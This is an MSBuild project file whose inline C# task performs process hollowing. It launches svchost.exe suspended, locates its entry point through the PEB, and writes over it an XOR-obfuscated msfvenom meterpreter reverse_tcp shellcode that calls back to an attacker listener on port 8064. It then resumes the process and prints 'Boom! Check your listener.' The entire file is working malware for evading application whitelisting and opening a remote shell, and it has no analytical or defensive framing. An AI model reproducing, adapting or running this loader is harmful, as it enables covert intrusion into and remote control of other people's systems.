<!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe processHollow.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Runtime.InteropServices;
          using System.Threading;
          using System.Diagnostics;

          public class ClassExample : Microsoft.Build.Utilities.Task
          {
              // Define necessary structures
              [StructLayout(LayoutKind.Sequential)]
              public struct STARTUPINFO
              {
                  public uint cb;
                  public string lpReserved;
                  public string lpDesktop;
                  public string lpTitle;
                  public uint dwX;
                  public uint dwY;
                  public uint dwXSize;
                  public uint dwYSize;
                  public uint dwXCountChars;
                  public uint dwYCountChars;
                  public uint dwFillAttribute;
                  public uint dwFlags;
                  public ushort wShowWindow;
                  public ushort cbReserved2;
                  public IntPtr lpReserved2;
                  public IntPtr hStdInput;
                  public IntPtr hStdOutput;
                  public IntPtr hStdError;
              }

              [StructLayout(LayoutKind.Sequential)]
              public struct PROCESS_INFORMATION
              {
                  public IntPtr hProcess;
                  public IntPtr hThread;
                  public uint dwProcessId;
                  public uint dwThreadId;
              }

              [StructLayout(LayoutKind.Sequential)]
              public struct CLIENT_ID
              {
                  public IntPtr UniqueProcess;
                  public IntPtr UniqueThread;
              }

              [StructLayout(LayoutKind.Sequential)]
              public struct PROCESS_BASIC_INFORMATION
              {
                  public IntPtr ExitStatus;
                  public IntPtr PebAddress;
                  public IntPtr AffinityMask;
                  public IntPtr BasePriority;
                  public IntPtr UniqueProcessId;
                  public IntPtr InheritedFromUniqueProcessId;
              }

              // Constants
              const uint CREATE_SUSPENDED = 0x00000004;
              const int ProcessBasicInformation = 0;

              // Function declarations
              [DllImport("kernel32.dll", SetLastError = true)]
              static extern bool CreateProcess(
                  string lpApplicationName,
                  string lpCommandLine,
                  IntPtr lpProcessAttributes,
                  IntPtr lpThreadAttributes,
                  bool bInheritHandles,
                  uint dwCreationFlags,
                  IntPtr lpEnvironment,
                  string lpCurrentDirectory,
                  ref STARTUPINFO lpStartupInfo,
                  out PROCESS_INFORMATION lpProcessInformation
              );

              [DllImport("ntdll.dll")]
              static extern int NtQueryInformationProcess(
                  IntPtr hProcess,
                  int processInformationClass,
                  ref PROCESS_BASIC_INFORMATION processInformation,
                  uint processInformationLength,
                  ref uint returnLength
              );

              [DllImport("ntdll.dll")]
              static extern int NtReadVirtualMemory(
                  IntPtr hProcess,
                  IntPtr lpBaseAddress,
                  byte[] lpamitfer,
                  int NumberOfBytesToRead,
                  out IntPtr lpNumberOfBytesRead
              );

              [DllImport("kernel32.dll")]
              static extern bool WriteProcessMemory(
                  IntPtr hProcess,
                  IntPtr lpBaseAddress,
                  byte[] lpamitfer,
                  int NumberOfBytesToWrite,
                  out IntPtr lpNumberOfBytesWritten
              );

              [DllImport("ntdll.dll", SetLastError = true)]
              static extern bool NtResumeProcess(IntPtr hThread);

              public static void Main()
              {
                  STARTUPINFO si = new STARTUPINFO();
                  PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                  // Create process in suspended state
                  bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

                  PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                  uint tmp = 0;
                  IntPtr hProcess = pi.hProcess;

                  NtQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

                  IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);

                  byte[] baseAddressBytes = new byte[IntPtr.Size];
                  IntPtr nRead;
                  NtReadVirtualMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
                  IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

                  byte[] data = new byte[0x200];
                  NtReadVirtualMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);

                  uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
                  uint entrypointRvaOffset = e_lfanew + 0x28;
                  uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);

                  IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

                  // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=8064 -f csharp EXITFUNC=thread
                  // XOR'd with key: 0xfa
                  byte[] buf = new byte[511] { 0x06,0xB2,0x79,0x1E,0x0A,0x12,0x36,0xFA,0xFA,0xFA,0xBB,0xAB,0xBB,0xAA,0xA8,0xB2,0xCB,0x28,0xAB,0xAC,0x9F,0xB2,0x71,0xA8,0x9A,0xB2,0x71,0xA8,0xE2,0xB2,0x71,0xA8,0xDA,0xB2,0x71,0x88,0xAA,0xB7,0xCB,0x33,0xB2,0xF5,0x4D,0xB0,0xB0,0xB2,0xCB,0x3A,0x56,0xC6,0x9B,0x86,0xF8,0xD6,0xDA,0xBB,0x3B,0x33,0xF7,0xBB,0xFB,0x3B,0x18,0x17,0xA8,0xBB,0xAB,0xB2,0x71,0xA8,0xDA,0x71,0xB8,0xC6,0xB2,0xFB,0x2A,0x9C,0x7B,0x82,0xE2,0xF1,0xF8,0xF5,0x7F,0x88,0xFA,0xFA,0xFA,0x71,0x7A,0x72,0xFA,0xFA,0xFA,0xB2,0x7F,0x3A,0x8E,0x9D,0xB2,0xFB,0x2A,0xAA,0xBE,0x71,0xBA,0xDA,0x71,0xB2,0xE2,0xB3,0xFB,0x2A,0x19,0xAC,0xB2,0x05,0x33,0xB7,0xCB,0x33,0xBB,0x71,0xCE,0x72,0xB2,0xFB,0x2C,0xB2,0xCB,0x3A,0x56,0xBB,0x3B,0x33,0xF7,0xBB,0xFB,0x3B,0xC2,0x1A,0x8F,0x0B,0xB6,0xF9,0xB6,0xDE,0xF2,0xBF,0xC3,0x2B,0x8F,0x22,0xA2,0xBE,0x71,0xBA,0xDE,0xB3,0xFB,0x2A,0x9C,0xBB,0x71,0xF6,0xB2,0xBE,0x71,0xBA,0xE6,0xB3,0xFB,0x2A,0xBB,0x71,0xFE,0x72,0xBB,0xA2,0xB2,0xFB,0x2A,0xBB,0xA2,0xA4,0xA3,0xA0,0xBB,0xA2,0xBB,0xA3,0xBB,0xA0,0xB2,0x79,0x16,0xDA,0xBB,0xA8,0x05,0x1A,0xA2,0xBB,0xA3,0xA0,0xB2,0x71,0xE8,0x13,0xB1,0x05,0x05,0x05,0xA7,0xB3,0x44,0x8D,0x89,0xC8,0xA5,0xC9,0xC8,0xFA,0xFA,0xBB,0xAC,0xB3,0x73,0x1C,0xB2,0x7B,0x16,0x5A,0xFB,0xFA,0xFA,0xB3,0x73,0x1F,0xB3,0x46,0xF8,0xFA,0xFB,0x41,0x3A,0x52,0xD7,0x25,0xBB,0xAE,0xB3,0x73,0x1E,0xB6,0x73,0x0B,0xBB,0x40,0xB6,0x8D,0xDC,0xFD,0x05,0x2F,0xB6,0x73,0x10,0x92,0xFB,0xFB,0xFA,0xFA,0xA3,0xBB,0x40,0xD3,0x7A,0x91,0xFA,0x05,0x2F,0x90,0xF0,0xBB,0xA4,0xAA,0xAA,0xB7,0xCB,0x33,0xB7,0xCB,0x3A,0xB2,0x05,0x3A,0xB2,0x73,0x38,0xB2,0x05,0x3A,0xB2,0x73,0x3B,0xBB,0x40,0x10,0xF5,0x25,0x1A,0x05,0x2F,0xB2,0x73,0x3D,0x90,0xEA,0xBB,0xA2,0xB6,0x73,0x18,0xB2,0x73,0x03,0xBB,0x40,0x63,0x5F,0x8E,0x9B,0x05,0x2F,0x7F,0x3A,0x8E,0xF0,0xB3,0x05,0x34,0x8F,0x1F,0x12,0x69,0xFA,0xFA,0xFA,0xB2,0x79,0x16,0xEA,0xB2,0x73,0x18,0xB7,0xCB,0x33,0x90,0xFE,0xBB,0xA2,0xB2,0x73,0x03,0xBB,0x40,0xF8,0x23,0x32,0xA5,0x05,0x2F,0x79,0x02,0xFA,0x84,0xAF,0xB2,0x79,0x3E,0xDA,0xA4,0x73,0x0C,0x90,0xBA,0xBB,0xA3,0x92,0xFA,0xEA,0xFA,0xFA,0xBB,0xA2,0xB2,0x73,0x08,0xB2,0xCB,0x33,0xBB,0x40,0xA2,0x5E,0xA9,0x1F,0x05,0x2F,0xB2,0x73,0x39,0xB3,0x73,0x3D,0xB7,0xCB,0x33,0xB3,0x73,0x0A,0xB2,0x73,0x20,0xB2,0x73,0x03,0xBB,0x40,0xF8,0x23,0x32,0xA5,0x05,0x2F,0x79,0x02,0xFA,0x87,0xD2,0xA2,0xBB,0xAD,0xA3,0x92,0xFA,0xBA,0xFA,0xFA,0xBB,0xA2,0x90,0xFA,0xA0,0xBB,0x40,0xF1,0xD5,0xF5,0xCA,0x05,0x2F,0xAD,0xA3,0xBB,0x40,0x8F,0x94,0xB7,0x9B,0x05,0x2F,0xB3,0x05,0x34,0x13,0xC6,0x05,0x05,0x05,0xB2,0xFB,0x39,0xB2,0xD3,0x3C,0xB2,0x7F,0x0C,0x8F,0x4E,0xBB,0x05,0x1D,0xA2,0x90,0xFA,0xA3,0x41,0x1A,0xE7,0xD0,0xF0,0xBB,0x73,0x20,0x05,0x2F };
                  
                  for (int i = 0; i < buf.Length; i++)
                  {
                      buf[i] = (byte)((uint)buf[i] ^ 0xfa);
                  }

                  WriteProcessMemory(hProcess, entrypointAddress, buf, buf.Length, out nRead);

                  // Step 8: Resume the thread to execute the shellcode
                  NtResumeProcess(pi.hProcess);
                  Console.WriteLine("Boom! Check your listener.");
              }

              public override bool Execute()
              {
                  Main();
                  return true;
              }
              
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
